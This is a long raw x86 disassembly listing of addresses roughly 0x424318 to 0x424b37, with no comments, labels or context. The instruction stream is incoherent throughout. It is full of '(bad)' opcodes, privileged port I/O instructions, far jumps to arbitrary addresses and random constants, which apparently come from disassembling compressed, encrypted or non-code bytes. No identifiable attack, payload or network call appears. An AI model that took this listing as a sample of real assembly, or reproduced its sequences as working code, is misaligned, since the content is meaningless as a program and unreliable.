  424318:	xlat   BYTE PTR ds:[ebx]
  424319:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42431a:	xchg   BYTE PTR [esi],bl
  42431c:	or     DWORD PTR [ebx],esi
  42431e:	in     eax,dx
  42431f:	daa    
  424320:	or     ch,ah
  424322:	mov    cl,0x29
  424324:	(bad)  
  424325:	sbb    eax,0x4decfd25
  42432a:	and    eax,0x111ce481
  42432f:	jb     0x424356
  424331:	std    
  424332:	fs jo  0x42430e
  424335:	fcos   
  424337:	call   0xd984a39d
  42433c:	out    0x89,al
  42433e:	add    eax,0x83d961e8
  424343:	ret    0x5d5b
  424346:	mov    al,ds:0x85d961eb
  42434b:	stos   BYTE PTR es:[edi],al
  42434c:	fistp  QWORD PTR [ecx+0x18f2ffff]
  424352:	and    eax,0x62d92f18
  424357:	add    DWORD PTR [eax],esp
  424359:	(bad)  
  42435b:	ret    
  42435c:	aas    
  42435d:	or     BYTE PTR [edx],al
  42435f:	push   0x3b
  424361:	dec    esi
  424362:	add    BYTE PTR [ebx+0x1084f400],cl
  424368:	in     al,dx
  424369:	aad    0x91
  42436b:	add    bl,0xc8
  42436e:	jge    0x424391
  424370:	mov    DWORD PTR [edi-0x47],edi
  424373:	push   ss
  424374:	je     0x4243b5
  424376:	push   es
  424377:	add    bl,ch
  424379:	or     al,0x8a
  42437b:	mov    edx,0x62e50f40
  424380:	add    cl,ch
  424382:	fadd   DWORD PTR [ecx-0x1d704c31]
  424388:	(bad)  
  424389:	xchg   esp,eax
  42438a:	mov    dx,0xab83
  42438e:	in     eax,0x87
  424390:	inc    esp
  424391:	pop    edi
  424392:	mov    ebp,0xdb11046e
  424397:	loope  0x4243a0
  424399:	popf   
  42439a:	sahf   
  42439b:	adc    DWORD PTR [eax+eax*8+0x5],esi
  42439f:	add    DWORD PTR [edx-0x17399b47],esi
  4243a5:	mov    BYTE PTR [esi+0x1a40fff7],al
  4243ab:	adc    DWORD PTR [ebp-0xf54811],ecx
  4243b1:	imul   ebx,ecx,0xffffffff
  4243b4:	(bad)  
  4243b5:	mov    ebx,0x8a00b190
  4243ba:	fild   DWORD PTR [eax]
  4243bc:	push   0xffffffdf
  4243be:	xor    ch,cl
  4243c0:	(bad)  
  4243c1:	mov    ebx,ebx
  4243c3:	add    BYTE PTR [ebx-0x7cf546c9],cl
  4243c9:	add    BYTE PTR [edx-0x7f],ah
  4243cc:	mov    al,0x87
  4243ce:	jb     0x424412
  4243d0:	mov    bh,0x3
  4243d2:	cmc    
  4243d3:	shr    DWORD PTR [eax+esi*8],1
  4243d6:	or     al,0x97
  4243d8:	or     ebp,DWORD PTR [esi+esi*2+0x62a90500]
  4243df:	sar    dh,0x3f
  4243e2:	(bad)  
  4243e3:	mov    al,ds:0x8062007c
  4243e8:	inc    BYTE PTR [esi+0x37cca42a]
  4243ee:	sub    ch,ch
  4243f0:	adc    ebp,DWORD PTR [ecx+0x7ffac062]
  4243f6:	scas   eax,DWORD PTR es:[edi]
  4243f7:	les    edx,FWORD PTR [eax-0x5]
  4243fa:	ja     0x424420
  4243fc:	or     al,BYTE PTR [eax+0x62]
  4243ff:	cmp    eax,0x30a70bbe
  424404:	jnp    0x4243f8
  424406:	mov    gs,eax
  424408:	mov    ecx,edx
  42440a:	or     ah,BYTE PTR [ecx-0x5f]
  42440d:	cli    
  42440e:	cmc    
  42440f:	pop    eax
  424410:	ds je  0x424462
  424413:	fld    TBYTE PTR [ecx-0x155d48c]
  424419:	push   ecx
  42441a:	fnsave [ebp-0x3fddead2]
  424420:	(bad)  
  424421:	sar    BYTE PTR [eax],1
  424423:	shr    DWORD PTR [eax+eax*1],0x2c
  424427:	dec    ebx
  424428:	leave  
  424429:	call   0xfbfb2d5b
  42442e:	add    cl,cl
  424430:	mov    al,ds:0x9d36ed7b
  424435:	dec    ebx
  424436:	sti    
  424437:	dec    edi
  424438:	call   0x45a48446
  42443d:	mov    esi,0xb03d7974
  424442:	je     0x42449d
  424444:	fstp   DWORD PTR [esi]
  424446:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424447:	push   cs
  424448:	(bad)  
  42444a:	inc    eax
  42444b:	inc    esi
  42444c:	in     eax,dx
  42444d:	jmp    0x26bf:0xd562662f
  424454:	std    
  424455:	xlat   BYTE PTR ds:[ebx]
  424456:	add    al,0x62
  424458:	(bad)  
  42445a:	stos   BYTE PTR es:[edi],al
  42445b:	jno    0x4244b5
  42445d:	scas   eax,DWORD PTR es:[edi]
  42445e:	add    eax,0x2fe7d8e2
  424463:	pop    ecx
  424464:	inc    ebx
  424465:	jmp    0xe885a693
  42446a:	repnz das 
  42446c:	bound  esp,QWORD PTR [ebx-0x742f9954]
  424472:	mov    bh,0xe7
  424474:	into   
  424475:	repz jg 0x424428
  424478:	fsub   st,st(7)
  42447a:	add    ebp,edi
  42447c:	sbb    al,0xcc
  42447e:	fbld   TBYTE PTR [ebp+0x4640a32f]
  424484:	add    eax,0xd9620424
  424489:	pop    edx
  42448a:	adc    DWORD PTR [esi-0x20fc5814],esp
  424490:	cwde   
  424491:	fstp   TBYTE PTR [edi+0x0]
  424494:	xchg   esp,eax
  424495:	fsub   st,st(7)
  424497:	add    ebx,ebp
  424499:	sbb    al,0x4
  42449b:	sub    al,0x69
  42449d:	mov    es,WORD PTR [eax-0x75]
  4244a0:	push   ds
  4244a1:	std    
  4244a2:	ret    
  4244a3:	push   es
  4244a4:	adc    DWORD PTR [ecx-0x1d8d5ed7],ebx
  4244aa:	jae    0x53a41ee
  4244b0:	das    
  4244b1:	or     DWORD PTR [edi-0x3a],ebx
  4244b4:	mov    edx,0xa9b60acf
  4244b9:	or     al,0x2f
  4244bc:	push   0x62
  4244be:	add    DWORD PTR [edi+eiz*8],esp
  4244c1:	inc    esp
  4244c2:	and    eax,0x85fbb881
  4244c7:	sub    eax,0x25263d82
  4244cc:	adc    BYTE PTR [ecx],0xa
  4244cf:	sahf   
  4244d0:	test   eax,0x4205455d
  4244d5:	inc    BYTE PTR [ebp+ecx*1+0x66]
  4244d9:	cwde   
  4244da:	loopne 0x4244b5
  4244dc:	fs mov cl,al
  4244df:	loop   0x42450a
  4244e1:	mov    ebp,0xfda56205
  4244e6:	push   0x68fd9d70
  4244eb:	push   0x75
  4244ed:	std    
  4244ee:	sbb    cl,ch
  4244f0:	test   edi,ebx
  4244f2:	push   ebx
  4244f3:	cmp    BYTE PTR [esi+0x7a],bh
  4244f6:	add    ecx,ebp
  4244f8:	add    BYTE PTR [ecx+0x41],ah
  4244fb:	add    bl,ch
  4244fd:	popa   
  4244fe:	fxam   
  424500:	fadd   st,st(7)
  424502:	xchg   esp,eax
  424503:	add    eax,0x502e77f5
  424508:	rol    DWORD PTR [ebx+0x49e900d9],1
  42450e:	rol    DWORD PTR [eax],cl
  424510:	jmp    0x5b81576
  424515:	push   es
  424516:	inc    bp
  424518:	or     eax,0x178624e6
  42451d:	call   0x1b872ec2
  424522:	sar    edx,1
  424524:	push   0xffffff95
  424526:	std    
  424527:	sbb    al,0xe9
  424529:	jne    0x424515
  42452b:	push   ebx
  42452c:	push   ds
  42452d:	(bad)  
  42452e:	std    
  42452f:	ins    BYTE PTR es:[edi],dx
  424530:	adc    DWORD PTR [ecx+ebx*8],0xd879e900
  424537:	(bad)  
  424538:	(bad)  
  424539:	mov    ebx,0x9514e1d8
  42453e:	call   0x74f6:0x29aa7441
  424545:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424546:	cld    
  424547:	push   0xd87ba8
  42454c:	push   0xda73
  424551:	mov    WORD PTR [ecx],cs
  424553:	and    eax,0x25190e20
  424558:	cmp    BYTE PTR [ebx+0x62],cl
  42455b:	iret   
  42455c:	mov    eax,DWORD PTR [eax]
  42455e:	or     al,0x85
  424560:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424561:	cli    
  424562:	or     al,0x8e
  424564:	jp     0x4245e2
  424566:	addr16 mov ebp,0x234a73fa
  42456c:	div    BYTE PTR [edi+eiz*1-0x4]
  424570:	push   0xd84ba4
  424575:	push   0xda47
  42457a:	shr    al,1
  42457c:	out    dx,al
  42457d:	ret    
  42457e:	cmp    eax,DWORD PTR [eax+eiz*1]
  424581:	push   ebp
  424582:	mov    WORD PTR [ecx],cs
  424584:	and    eax,0x134636c
  424589:	add    bl,bh
  42458b:	inc    DWORD PTR [ebx]
  42458d:	add    cl,BYTE PTR [ebx]
  42458f:	fdiv   st,st(5)
  424591:	je     0x4245fa
  424593:	mov    ebp,0xd567448d
  424598:	dec    edx
  424599:	mov    eax,DWORD PTR [ebp+0x62]
  42459c:	(bad)  
  42459d:	call   0x38d7bc
  4245a2:	xchg   ebp,eax
  4245a3:	call   0x74f6:0x245a7400
  4245aa:	xchg   edi,eax
  4245ab:	sti    
  4245ac:	mov    eax,DWORD PTR [edi+eiz*4-0x45]
  4245b0:	bound  esp,QWORD PTR [eax-0x13d9e]
  4245b6:	cmp    al,dl
  4245b8:	add    BYTE PTR [eax],al
  4245ba:	(bad)  
  4245bb:	(bad)  [eax]
  4245bd:	and    al,0x42
  4245bf:	inc    edi
  4245c0:	retf   
  4245c1:	push   eax
  4245c2:	add    cl,ch
  4245c4:	cli    
  4245c5:	lods   al,BYTE PTR ds:[esi]
  4245c6:	inc    edi
  4245c7:	mov    dl,al
  4245c9:	mov    ch,0xf3
  4245cb:	mov    eax,ds:0x620006c1
  4245d0:	(bad)  cs:[ebp+0x62]
  4245d4:	lock into 
  4245d6:	xchg   DWORD PTR [ebp+0x64e96899],ebx
  4245dc:	call   0xb28:0xdcaeb305
  4245e3:	or     eax,0x43c14b81
  4245e8:	mov    cl,0x9
  4245ea:	enter  0xe8b3,0x6
  4245ee:	(bad)  
  4245ef:	cmp    eax,0x4ffb4cc1
  4245f4:	cmp    BYTE PTR [edx],cl
  4245f6:	inc    eax
  4245f7:	bound  eax,QWORD PTR [ebx]
  4245f9:	push   ebx
  4245fa:	pop    ebp
  4245fb:	mov    DWORD PTR [edi],edi
  4245fd:	mov    edx,0xfec52050
  424602:	icebp  
  424603:	pop    edi
  424604:	nop
  424605:	and    al,BYTE PTR [edx+eiz*2-0x44]
  424609:	sub    bl,BYTE PTR [edi]
  42460b:	cli    
  42460c:	sahf   
  42460d:	cmp    al,BYTE PTR [eax]
  42460f:	bound  edi,QWORD PTR [esi+edi*4]
  424612:	je     0x42466c
  424614:	aaa    
  424615:	add    ebx,DWORD PTR [eax]
  424617:	js     0x424695
  424619:	dec    BYTE PTR [edx]
  42461b:	lods   eax,DWORD PTR ds:[esi]
  42461c:	inc    ecx
  42461d:	cli    
  42461e:	add    BYTE PTR [edx-0x40],ah
  424621:	add    eax,0xffc0ebb3
  424626:	inc    DWORD PTR [eax]
  424628:	bound  eax,QWORD PTR [ecx]
  42462a:	sahf   
  42462b:	adc    BYTE PTR [ecx-0x27],bl
  42462e:	sub    al,al
  424630:	mov    ecx,0x220ffffc
  424635:	fstp   DWORD PTR [ecx]
  424637:	(bad)  
  424638:	jge    0x42467f
  42463a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42463b:	add    ebx,DWORD PTR [esi+0x4d]
  42463e:	mov    edx,0xe81d52ab
  424643:	add    ebx,esi
  424645:	cdq    
  424646:	jl     0x42462e
  424648:	in     al,0x25
  42464a:	(bad)  
  42464b:	(bad)  
  42464c:	fisub  WORD PTR [eax-0xe3d1aa4]
  424652:	dec    ebp
  424653:	dec    eax
  424654:	bound  ebx,QWORD PTR [esi+0x68]
  424657:	add    al,0x63
  424659:	(bad)  
  42465b:	jl     0x4246c0
  42465d:	js     0x42463f
  42465f:	sbb    eax,0x846ed9a6
  424664:	pop    esi
  424665:	fsub   st,st(7)
  424667:	add    ebx,ebx
  424669:	pop    ss
  42466a:	in     al,0xf6
  42466c:	add    eax,0x6208a619
  424671:	push   es
  424672:	test   al,0x9f
  424674:	cmp    edx,edx
  424676:	int    0x13
  424678:	push   esi
  424679:	sbb    eax,ebp
  42467b:	mov    ecx,0x4814095f
  424680:	(bad)  
  424681:	(bad)  
  424683:	loope  0x424682
  424685:	mov    ebp,0x5d620427
  42468a:	test   al,0x38
  42468c:	add    BYTE PTR [edi],bh
  42468e:	pop    esi
  42468f:	cmc    
  424690:	or     eax,DWORD PTR [ebp+ebx*1-0x2618118]
  424697:	jmp    0x424715
  424699:	jecxz  0x424673
  42469b:	call   0xe0baa8a3
  4246a0:	sbb    eax,0x406ed926
  4246a5:	jle    0x424688
  4246a7:	add    BYTE PTR [eax+0x4e],ah
  4246aa:	(bad)  
  4246ac:	call   0xaa034912
  4246b1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4246b2:	loopne 0x4246b4
  4246b4:	push   ds
  4246b5:	retf   
  4246b6:	int    0xe
  4246b8:	test   eax,0xd904c761
  4246bd:	inc    ebp
  4246be:	sbb    eax,0x2734ed01
  4246c3:	jne    0x424671
  4246c5:	stc    
  4246c6:	test   BYTE PTR [esi],bh
  4246c8:	jmp    0x7603a42e
  4246cd:	sbb    eax,0x620d7d52
  4246d2:	fnstenv [ebx-0x9]
  4246d5:	ins    BYTE PTR es:[edi],dx
  4246d6:	(bad)  
  4246d7:	push   ebx
  4246d8:	aas    
  4246d9:	or     BYTE PTR [edx],al
  4246db:	iret   
  4246dc:	nop
  4246dd:	imul   edi,DWORD PTR [ebx],0x75f9e945
  4246e3:	repz mov esi,0xab563410
  4246e9:	gs fyl2xp1 
  4246ec:	aam    0x1d
  4246ee:	loopne 0x424730
  4246f0:	jmp    0x540d7af5
  4246f5:	sahf   
  4246f6:	ins    DWORD PTR es:[edi],dx
  4246f7:	cmc    
  4246f8:	adc    BYTE PTR [edx+0x19],ah
  4246fb:	aad    0x14
  4246fd:	sbb    DWORD PTR [ebx+0x19],ecx
  424700:	add    edx,eax
  424702:	sub    DWORD PTR [edi+0x7],eax
  424705:	pop    ss
  424706:	mov    eax,0x75cd75d4
  42470b:	pop    eax
  42470c:	into   
  42470d:	and    BYTE PTR [ebx],0x1
  424710:	rcl    DWORD PTR [edx+0x15],0x34
  424714:	push   esi
  424715:	pop    esi
  424716:	or     dl,BYTE PTR [ebp-0x349e56eb]
  42471c:	add    al,0x19
  42471e:	inc    edx
  42471f:	adc    eax,0x8cf0001
  424724:	cmp    al,0xe8
  424726:	add    eax,0x3f000118
  42472b:	pushf  
  42472c:	jne    0x424762
  42472e:	je     0x424721
  424730:	les    edx,FWORD PTR [edx]
  424732:	or     ebx,ebp
  424734:	or     DWORD PTR ds:0x44ef63,0x10d5592
  42473e:	mov    ebx,0xd81573dc
  424743:	pushf  
  424744:	push   ecx
  424745:	push   eax
  424746:	sti    
  424747:	(bad)  
  424748:	int3   
  424749:	mov    ecx,0x44ee83
  42474e:	arpl   WORD PTR [ebp-0x397b0010],di
  424754:	mov    edx,0xefc80040
  424759:	add    edi,edi
  42475b:	outs   dx,BYTE PTR ds:[esi]
  42475c:	adc    al,0xb
  42475e:	inc    eax
  42475f:	jnp    0x424726
  424761:	mov    edx,0xeb824c3
  424766:	adc    al,0x8b
  424768:	aad    0xee
  42476a:	add    eax,0x44f04b
  42476f:	aas    
  424770:	xor    dh,BYTE PTR [ebp+0x49]
  424773:	rcr    ebx,cl
  424775:	cmp    DWORD PTR [eax],eax
  424777:	dec    ebx
  424778:	pop    eax
  424779:	shl    DWORD PTR [ebx+edi*2-0x76],0x14
  42477e:	les    ebp,FWORD PTR [ecx]
  424780:	sbb    al,0x1
  424782:	mov    ebx,esi
  424784:	jecxz  0x4247e8
  424786:	inc    esp
  424787:	or     eax,ebx
  424789:	or     BYTE PTR [edx+edi*8],0xdb
  42478d:	add    BYTE PTR [ebp+0x1f],dh
  424790:	dec    ebp
  424791:	scas   eax,DWORD PTR es:[edi]
  424792:	or     BYTE PTR [edx],cl
  424794:	fadd   QWORD PTR [eax]
  424796:	test   DWORD PTR [ebp+0x62561711],ecx
  42479c:	daa    
  42479d:	adc    ch,al
  42479f:	dec    esi
  4247a0:	cmp    dh,0x84
  4247a3:	mov    ds:0x3250158c,al
  4247a8:	jb     0x42479f
  4247aa:	int    0xb
  4247ac:	mov    edx,0x1a62441c
  4247b1:	(bad)  
  4247b2:	cmc    
  4247b3:	mov    ebp,0x14bff3f6
  4247b8:	add    edi,DWORD PTR [edx+eax*8+0x0]
  4247bc:	or     al,0x3
  4247be:	dec    edi
  4247bf:	sti    
  4247c0:	jg     0x4247a8
  4247c2:	adc    eax,DWORD PTR [eax+0x62]
  4247c5:	jo     0x424844
  4247c7:	out    dx,al
  4247c8:	fisttp WORD PTR [eax]
  4247ca:	cmp    DWORD PTR [ebx],esi
  4247cc:	loope  0x424796
  4247ce:	mov    cl,0x74
  4247d0:	push   eax
  4247d1:	xor    eax,0xb04c74b7
  4247d6:	add    esi,DWORD PTR [eax]
  4247d8:	push   es
  4247d9:	test   BYTE PTR [esp+eax*1],0xf6
  4247dd:	fcomp  QWORD PTR [eax+ebx*4-0x7c013de0]
  4247e4:	and    cl,BYTE PTR ds:0x2a7aa111
  4247ea:	dec    ecx
  4247eb:	add    cl,bl
  4247ed:	inc    eax
  4247ee:	inc    BYTE PTR [eax]
  4247f0:	(bad)  
  4247f1:	shl    BYTE PTR [edi+0x42],0x56
  4247f5:	and    DWORD PTR [esi],eax
  4247f7:	data16 sahf 
  4247f9:	sar    BYTE PTR [ebp-0x80],0x66
  4247fd:	sar    esi,0xff
  424800:	fcomi  st,st(6)
  424802:	or     al,0x5a
  424804:	and    esi,ebp
  424806:	jnp    0x4247f4
  424808:	lods   al,BYTE PTR ds:[esi]
  424809:	dec    edi
  42480a:	xor    edx,DWORD PTR [ecx*1-0x7004f132]
  424811:	lods   al,BYTE PTR ds:[esi]
  424812:	mov    cl,0x75
  424814:	push   0xffffffd9
  424816:	bound  edx,QWORD PTR [esi]
  424818:	push   ds
  424819:	out    0xa7,al
  42481b:	add    esp,ebp
  42481d:	and    al,0xe0
  42481f:	jl     0x424821
  424821:	repnz bound ebx,QWORD PTR [edx]
  424824:	fwait
  424825:	clc    
  424826:	into   
  424827:	inc    ebx
  424828:	mov    al,0xdd
  42482a:	xchg   edi,eax
  42482b:	call   0xdd56:0xe7ea0c4e
  424832:	mov    ebp,0xe537b092
  424837:	and    dh,BYTE PTR [esi]
  424839:	push   edx
  42483a:	into   
  42483b:	xchg   ebp,eax
  42483c:	jmp    FWORD PTR [eax+0x4fb0e044]
  424842:	or     esp,esi
  424844:	inc    ebx
  424845:	bound  esp,QWORD PTR [edx-0x63]
  424848:	sti    
  424849:	fmul   st(1),st
  42484b:	outs   dx,DWORD PTR ds:[esi]
  42484c:	sar    DWORD PTR [edx+0x44],0xf3
  424850:	scas   eax,DWORD PTR es:[edi]
  424851:	mov    DWORD PTR [edx+0x22],esp
  424854:	push   ecx
  424855:	pop    ds
  424856:	fwait
  424857:	clc    
  424858:	add    ecx,DWORD PTR [edi]
  42485a:	(bad)  
  42485b:	int3   
  42485c:	push   esi
  42485d:	imul   eax,DWORD PTR [eax+esi*8-0x52],0x39cae4ef
  424865:	jb     0x424835
  424867:	cmp    eax,0xf0445900
  42486c:	scas   al,BYTE PTR es:[edi]
  42486d:	ja     0x424844
  42486f:	fild   DWORD PTR [ebx+0x62]
  424872:	bound  edx,QWORD PTR ds:0x6fc8e4fc
  424878:	mov    esi,0xaf9b204a
  42487d:	sub    DWORD PTR [edx-0x56],esp
  424880:	dec    esi
  424881:	xchg   DWORD PTR [ebx-0x48fffc0c],ebx
  424887:	bound  edx,QWORD PTR [esi+edx*2-0x511fbbe7]
  42488e:	xchg   edi,eax
  42488f:	in     eax,0x0
  424891:	jbe    0x4248de
  424893:	jmp    0xd3403d91
  424898:	je     0x42488b
  42489a:	(bad)
  42489e:	mov    eax,ds:0xe9bc85d9
  4248a3:	push   esi
  4248a4:	icebp  
  4248a5:	bound  ebx,QWORD PTR [ecx+eax*8]
  4248a8:	sbb    al,0x46
  4248aa:	add    eax,0x1c2786d2
  4248af:	sub    al,0xbf
  4248b1:	frstor [ecx+0x28]
  4248b4:	mov    DWORD PTR [ebp+0x3b85cec5],ebx
  4248ba:	jp     0x4248f3
  4248bc:	push   ebx
  4248bd:	jb     0x424929
  4248bf:	cmc    
  4248c0:	or     al,0x6c
  4248c2:	in     al,dx
  4248c3:	inc    esp
  4248c4:	popa   
  4248c5:	push   0x4c
  4248c7:	aad    0x0
  4248c9:	jg     0x4248f6
  4248cb:	sub    al,BYTE PTR [esi+0x36fe6583]
  4248d1:	add    ebp,ecx
  4248d3:	stc    
  4248d4:	(bad)  
  4248d5:	call   0xe9ebe3b3
  4248da:	popa   
  4248db:	push   esi
  4248dc:	leave  
  4248dd:	jo     0x42490c
  4248df:	cmc    
  4248e0:	adc    BYTE PTR [esi+eiz*4+0x44],ch
  4248e4:	cmp    bh,BYTE PTR [edx]
  4248e6:	push   ecx
  4248e7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4248e8:	cmp    BYTE PTR [edi],ah
  4248ea:	add    BYTE PTR [edx+0x47],ch
  4248ed:	xor    edx,DWORD PTR [ecx+edx*2]
  4248f0:	mov    esi,0xcc462f86
  4248f5:	lds    ebp,FWORD PTR [edx-0x77]
  4248f8:	aad    0xff
  4248fa:	sbb    esp,DWORD PTR [ecx+ebx*2+0x7d]
  4248fe:	lds    edx,FWORD PTR [eax-0x27]
  424901:	stc    
  424902:	fxtract 
  424904:	dec    ecx
  424905:	or     DWORD PTR [ebx],eax
  424907:	pusha  
  424908:	sub    BYTE PTR [ebp+0x0],dh
  42490b:	pop    es
  42490c:	repz (bad) 
  42490e:	jmp    0x34a1:0xe800f2f9
  424915:	add    DWORD PTR [eax],eax
  424917:	or     BYTE PTR [eiz*1-0x3ba837e8],0xc
  42491f:	inc    eax
  424920:	sbb    eax,DWORD PTR ds:0x52293d72
  424926:	pop    edi
  424927:	or     eax,0xcb04bb1e
  42492c:	daa    
  42492d:	dec    edi
  42492e:	push   edi
  42492f:	push   eax
  424930:	leave  
  424931:	sub    BYTE PTR [ecx-0x9],0xd8
  424935:	call   0xf6c156c5
  42493a:	mov    edx,edi
  42493c:	mov    ah,0xa
  42493e:	mov    ah,BYTE PTR [ebx]
  424940:	push   esp
  424941:	shl    BYTE PTR [edi+ebp*4+0x61],cl
  424945:	out    dx,eax
  424946:	je     0x4248db
  424948:	jo     0x424999
  42494a:	test   al,0x8b
  42494c:	fadd   DWORD PTR [ebx-0x34e8ff40]
  424952:	or     DWORD PTR [esi+0x77],0xffffffc7
  424956:	or     BYTE PTR [edx-0x77],ch
  424959:	and    eax,0xb593c882
  42495e:	mov    al,ds:0xf6267b00
  424963:	xlat   BYTE PTR ds:[ebx]
  424964:	add    BYTE PTR [ebp-0x2b48247b],al
  42496a:	call   0xf6bde712
  42496f:	pop    edi
  424970:	rcl    BYTE PTR [ebx-0x1f06a4a9],1
  424976:	add    BYTE PTR [ebp-0x40],dl
  424979:	jns    0x4249c5
  42497b:	push   esi
  42497c:	mov    al,0xc4
  42497e:	mov    ch,BYTE PTR [ecx-0x79]
  424981:	aad    0xe8
  424983:	aas    
  424984:	(bad)  
  424985:	in     al,0xaa
  424987:	sti    
  424988:	call   0x8f19d316
  42498d:	lds    ebp,FWORD PTR [ebp+0x52477275]
  424993:	or     bl,dl
  424995:	rcl    BYTE PTR [esi-0x53c502e4],0xfb
  42499c:	outs   dx,DWORD PTR ds:[esi]
  42499d:	into   
  42499e:	lods   eax,DWORD PTR ds:[esi]
  42499f:	jne    0x4249f3
  4249a1:	sub    esi,DWORD PTR [edx]
  4249a3:	or     al,0xe5
  4249a5:	lods   al,BYTE PTR ds:[esi]
  4249a6:	idiv   dl
  4249a8:	mov    ah,0x36
  4249aa:	mov    ch,0x84
  4249ac:	mov    ecx,0x2de8038d
  4249b1:	mov    WORD PTR [ebx+edi*8+0x4afbd900],gs
  4249b8:	push   edi
  4249b9:	pop    ds
  4249ba:	add    BYTE PTR ds:0xa1470f00,dl
  4249c0:	dec    edi
  4249c1:	adc    al,0x47
  4249c3:	repnz xchg edi,eax
  4249c5:	cmp    edi,DWORD PTR [esi-0x2]
  4249c8:	out    0x99,eax
  4249ca:	pop    esp
  4249cb:	lods   al,BYTE PTR ds:[esi]
  4249cc:	sti    
  4249cd:	xchg   ebp,eax
  4249ce:	dec    esp
  4249cf:	adc    al,BYTE PTR [esi+0x1033caaa]
  4249d5:	test   DWORD PTR [edx+edi*8-0x6],ecx
  4249d9:	idiv   DWORD PTR [ecx-0x4e162d53]
  4249df:	adc    bh,0xf6
  4249e2:	ret    
  4249e3:	xor    edx,0xffffffef
  4249e6:	mov    ah,0xad
  4249e8:	jne    0x424a58
  4249ea:	aaa    
  4249eb:	push   ebx
  4249ec:	or     BYTE PTR [eax+0x4cc49689],dl
  4249f2:	mov    WORD PTR [ebp-0x54fd9618],gs
  4249f8:	sti    
  4249f9:	jmp    0x97999670
  4249fe:	fldenv [ebp+0x6f246213]
  424a04:	lahf   
  424a05:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424a06:	mov    ch,0x90
  424a08:	push   edx
  424a09:	lods   eax,DWORD PTR ds:[esi]
  424a0a:	and    al,0x32
  424a0c:	pushf  
  424a0d:	and    dl,BYTE PTR [eax-0x7e]
  424a10:	lods   al,BYTE PTR ds:[esi]
  424a11:	mov    esp,0x8e0340d8
  424a16:	add    edx,ecx
  424a18:	fwait
  424a19:	add    BYTE PTR ds:0xdd03e80a,dh
  424a1f:	leave  
  424a20:	ins    DWORD PTR es:[edi],dx
  424a21:	mov    ch,0x77
  424a23:	(bad)  
  424a24:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424a25:	cwde   
  424a26:	xchg   edx,eax
  424a27:	shr    DWORD PTR [esi+0x63d96243],0xc3
  424a2e:	dec    esi
  424a2f:	or     ecx,esi
  424a31:	mov    dl,0xc9
  424a33:	in     al,0x73
  424a35:	adc    DWORD PTR [edx],esp
  424a37:	fst    DWORD PTR [edi-0x296ea854]
  424a3d:	inc    ebx
  424a3e:	bound  ecx,QWORD PTR [esi-0x269def90]
  424a44:	mov    dh,0xac
  424a46:	outs   dx,DWORD PTR ds:[esi]
  424a47:	leave  
  424a48:	xchg   esi,eax
  424a49:	inc    edi
  424a4a:	(bad)  
  424a4b:	retf   0x7bf5
  424a4e:	fs sbb eax,ebp
  424a51:	outs   dx,BYTE PTR ds:[esi]
  424a52:	mov    ecx,ds
  424a54:	out    0x3,eax
  424a56:	jge    0x424a3f
  424a58:	call   DWORD PTR [edi+edi*8+0x7950e7d8]
  424a5f:	add    al,0xd8
  424a61:	ss es (bad) 
  424a65:	adc    edx,ebx
  424a67:	out    0x27,eax
  424a69:	add    al,0x95
  424a6b:	xchg   esp,eax
  424a6c:	push   esp
  424a6d:	sahf   
  424a6e:	fstp   QWORD PTR [edx-0x3587cf30]
  424a74:	mov    ebx,0x12b05f7
  424a79:	adc    al,0xad
  424a7b:	push   edx
  424a7c:	in     al,0xc
  424a7e:	add    BYTE PTR [edx*8-0x47359800],bl
  424a85:	add    eax,0x521a61e9
  424a8a:	and    DWORD PTR [ebx+0xd8efb43],0x73864ea3
  424a94:	test   DWORD PTR [edi],ecx
  424a96:	sub    DWORD PTR [esi+0x29],ebx
  424a99:	cli    
  424a9a:	fmul   QWORD PTR [ecx+0x6fe940db]
  424aa0:	fdiv   DWORD PTR [edi+0x18073de8]
  424aa6:	push   ecx
  424aa7:	outs   dx,BYTE PTR ds:[esi]
  424aa8:	(bad)  
  424aaa:	jmp    0x4ec71c0b
  424aaf:	xchg   ebx,eax
  424ab0:	xlat   BYTE PTR ds:[ebx]
  424ab1:	inc    eax
  424ab2:	push   eax
  424ab3:	(bad)  
  424ab4:	fadd   DWORD PTR [eax]
  424ab6:	jmp    0x5dce64ee
  424abb:	ret    0x165
  424abe:	jmp    0xf160db24
  424ac3:	(bad)  
  424ac4:	into   
  424ac5:	jmp    0xfb0c0683
  424aca:	fs sbb dh,ch
  424acd:	cli    
  424ace:	jmp    0x424b31
  424ad0:	fld1   
  424ad2:	pop    edx
  424ad3:	mov    al,0xd8
  424ad5:	add    BYTE PTR [esi+ecx*1+0x5b],ch
  424ad9:	add    cl,ch
  424adb:	popa   
  424adc:	push   edx
  424add:	retf   
  424ade:	add    DWORD PTR [edx-0x6a],esi
  424ae1:	cli    
  424ae2:	out    0x0,al
  424ae4:	loop   0x424a7e
  424ae6:	jns    0x424b0e
  424ae8:	inc    esp
  424ae9:	in     eax,0x8b
  424aeb:	and    eax,0x394fd942
  424af0:	mov    al,0x18
  424af2:	dec    esi
  424af3:	add    BYTE PTR [edx+ebp*8],ah
  424af6:	clc    
  424af7:	adc    DWORD PTR [ebx-0x23],edi
  424afa:	add    eax,0x75
  424afd:	iret   
  424afe:	pusha  
  424aff:	cmp    DWORD PTR [edi+0x19],esp
  424b02:	add    esi,DWORD PTR [edi+esi*1+0x60]
  424b06:	stc    
  424b07:	adc    al,0x46
  424b09:	mov    ebx,0x466dc92b
  424b0e:	dec    ebp
  424b0f:	inc    esp
  424b10:	aaa    
  424b11:	inc    edx
  424b12:	inc    ebp
  424b13:	and    al,0x17
  424b15:	sub    eax,0x195774b3
  424b1a:	add    DWORD PTR [ebp+0xf2a887],ecx
  424b20:	or     ebx,ebp
  424b22:	call   0xf6b55819
  424b27:	test   DWORD PTR [ebx],edi
  424b29:	ret    
  424b2a:	xchg   ebp,eax
  424b2b:	ror    BYTE PTR [edi-0x64],0x74
  424b2f:	or     bh,BYTE PTR [eax-0x63]
  424b32:	pop    edi
  424b33:	mov    DWORD PTR [edi],edi
  424b35:	test   al,0xee
  424b37:	add    BYTE PTR [ebx-0x35114824],bh
